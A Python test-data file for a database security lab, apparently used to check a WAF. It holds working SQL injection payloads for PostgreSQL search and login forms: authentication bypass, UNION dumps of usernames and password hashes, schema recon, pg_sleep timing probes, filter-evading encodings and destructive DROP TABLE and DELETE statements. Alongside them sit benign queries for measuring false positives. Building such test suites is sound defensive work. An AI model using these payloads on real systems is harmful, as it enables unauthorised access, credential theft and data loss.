"""DB Security Lab — набор тестовых пейлоадов.

MALICIOUS  — вредоносные пейлоады (30 шт., 10 категорий).
  expected: exploit (ожидаем видимый эффект инъекции) | error (ожидаем ошибку СУБД)
            | none (инъекция синтаксически принимается, эффекта нет)
LEGIT      — легитимные запросы для проверки ложных срабатываний WAF.
"""

MALICIOUS = [
    # --- тавтологии (auth/data bypass) ---
    {"id": "T01", "category": "tautology", "target": "search",
     "payload": "' OR '1'='1", "expected": "exploit",
     "note": "классика; ILIKE '%%' возвращает все строки"},
    {"id": "T02", "category": "tautology", "target": "search",
     "payload": "zz%' OR '1'='1", "expected": "none",
     "note": "инъекция принята СУБД, но хвостовой %' гасит тавтологию (учебный нюанс ILIKE-шаблона)"},
    {"id": "T03", "category": "tautology", "target": "search",
     "payload": "zz%' OR 1=1--", "expected": "exploit",
     "note": "тавтология + усечение хвоста"},
    {"id": "T04", "category": "tautology", "target": "login",
     "payload": "' OR '1'='1' --", "password": "any", "expected": "exploit",
     "note": "обход аутентификации: OR-тавтология + комментарий"},
    {"id": "T05", "category": "tautology", "target": "login",
     "payload": "admin'--", "password": "any", "expected": "exploit",
     "note": "вход как admin без пароля (комментарий съедает проверку)"},

    # --- UNION-based ---
    {"id": "U01", "category": "union", "target": "search",
     "payload": "zz%' UNION SELECT 1,'2','3',4--", "expected": "exploit",
     "note": "подбор колонок (типы должны совпадать с (bigint, varchar, varchar, numeric))"},
    {"id": "U02", "category": "union", "target": "search",
     "payload": "zz%' UNION ALL SELECT id, username, password_hash, 1 FROM users--",
     "expected": "exploit", "note": "экфильтрация логинов и bcrypt-хэшей"},
    {"id": "U03", "category": "union", "target": "search",
     "payload": "zz' UNION SELECT NULL, version(), current_database(), NULL--",
     "expected": "exploit", "note": "версия и имя СУБД"},

    # --- комментарии ---
    {"id": "C01", "category": "comment", "target": "search",
     "payload": "zz'--", "expected": "none",
     "note": "усечение хвоста без эффекта (инъекция принята СУБД)"},
    {"id": "C02", "category": "comment", "target": "search",
     "payload": "zz' OR '1'='1' --", "expected": "exploit"},
    {"id": "C03", "category": "comment", "target": "search",
     "payload": "zz' #", "expected": "error",
     "note": "MySQL-комментарий в PostgreSQL -> синтаксическая ошибка"},
    {"id": "C04", "category": "comment", "target": "search",
     "payload": "zz' /*tail", "expected": "error",
     "note": "незакрытый блочный комментарий"},

    # --- stacked queries ---
    {"id": "S01", "category": "stacked", "target": "search",
     "payload": "zz'; DROP TABLE products--", "expected": "error",
     "note": "asyncpg запрещает несколько операторов; плюс роль app_readonly"},
    {"id": "S02", "category": "stacked", "target": "search",
     "payload": "zz'; DELETE FROM users--", "expected": "error"},
    {"id": "S03", "category": "stacked", "target": "search",
     "payload": "zz'; SELECT 1--", "expected": "error"},

    # --- time-based ---
    {"id": "B01", "category": "time_based", "target": "search",
     "payload": "zz%' OR (SELECT count(*) FROM pg_sleep(2))>0--",
     "expected": "exploit",
     "note": "вольатильный подзапрос в OR-ветке не выбрасывается оптимизатором; задержка ~2 c"},
    {"id": "B02", "category": "time_based", "target": "search",
     "payload": "zz' AND 1=(SELECT 1 FROM pg_sleep(2))--",
     "expected": "exploit", "note": "pg_sleep как табличная функция"},

    # --- error-based ---
    {"id": "E01", "category": "error_based", "target": "search",
     "payload": "zz' AND (SELECT current_database())::int = 1--",
     "expected": "error", "note": "утечка имени БД в тексте ошибки"},
    {"id": "E02", "category": "error_based", "target": "search",
     "payload": "zz%' AND 1=CAST((SELECT current_database()) AS int)--",
     "expected": "error"},
    {"id": "E03", "category": "error_based", "target": "search",
     "payload": "zz' AND 1=(SELECT 1/0)--", "expected": "error",
     "note": "деление на ноль"},

    # --- разведка ---
    {"id": "R01", "category": "recon", "target": "search",
     "payload": "zz%' UNION SELECT 1, table_name::text, column_name::text, 1 FROM information_schema.columns--",
     "expected": "exploit", "note": "дамп схемы (типы колонок приведены к типам products)"},
    {"id": "R02", "category": "recon", "target": "search",
     "payload": "zz%' OR SUBSTRING(version(),1,1)='P'--",
     "expected": "exploit", "note": "boolean blind (PostgreSQL => все строки)"},
    {"id": "R03", "category": "recon", "target": "search",
     "payload": "zz%' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
     "expected": "exploit", "note": "blind EXISTS-проба"},

    # --- обфускация ---
    {"id": "O01", "category": "obfuscation", "target": "search",
     "payload": "zz%' uNiOn SeLeCt 1,'2','3',4--", "expected": "exploit",
     "note": "регистр"},
    {"id": "O02", "category": "obfuscation", "target": "search",
     "payload": "zz%' UNION/**/ALL/**/SELECT 1,'2','3',4--", "expected": "exploit",
     "note": "блочные комментарии как пробелы: UNION/**/SELECT — валидный SQL"},
    {"id": "O03", "category": "obfuscation", "target": "search",
     "payload": "%27%20OR%20%271%27%3D%271", "expected": "exploit",
     "note": "URL-encoding: сервер декодирует один раз, выполняется инъекция"},
    {"id": "O04", "category": "obfuscation", "target": "search",
     "payload": "%2527%2520OR%2520%271%27%3D%271", "expected": "error",
     "note": "двойное кодирование: после одного декодирования в значении остаётся кавычка -> ошибка SQL; WAF ловит нормализацией (unquote x2)"},

    # --- прочее ---
    {"id": "M01", "category": "semicolon", "target": "search",
     "payload": "zz';", "expected": "error"},
    {"id": "M02", "category": "quote", "target": "search",
     "payload": 'zz"', "expected": "none", "note": "проба двойной кавычки"},
    {"id": "M03", "category": "union", "target": "login",
     "payload": "zzz' UNION SELECT 7,'fake','Fake User','admin','notahash'--",
     "password": "any", "expected": "exploit",
     "note": "поддельный пользователь из UNION (обход аутентификации)"},
]

LEGIT = [
    {"id": "L01", "target": "search", "value": "ноутбук",  "min_rows": 1},
    {"id": "L02", "target": "search", "value": "Logitech", "min_rows": 1},
    {"id": "L03", "target": "search", "value": "980 Pro",  "min_rows": 1},
    {"id": "L04", "target": "search", "value": "мышь",     "min_rows": 1},
    {"id": "L05", "target": "search", "value": "роутер",   "min_rows": 1},
    {"id": "L06", "target": "search", "value": "O'Brien",  "min_rows": 0,
     "note": "апостроф в данных — известный ложный триггер low-правила SQLI-QUOTE"},
    {"id": "L09", "target": "search", "value": "монитор 27", "min_rows": 1,
     "note": "кавычка в названии товара сама по себе не ищем; без кавычек правило не задевается"},
    {"id": "L07", "target": "login", "value": "admin", "password": "admin123", "expect_auth": True},
    {"id": "L08", "target": "login", "value": "jdoe",  "password": "jdoe123",  "expect_auth": True},
]

# Ложные срабатывания, которые мы ОЖИДАЕМ и фиксируем честно (WAF ON).
EXPECTED_FALSE_POSITIVES = {"L06"}
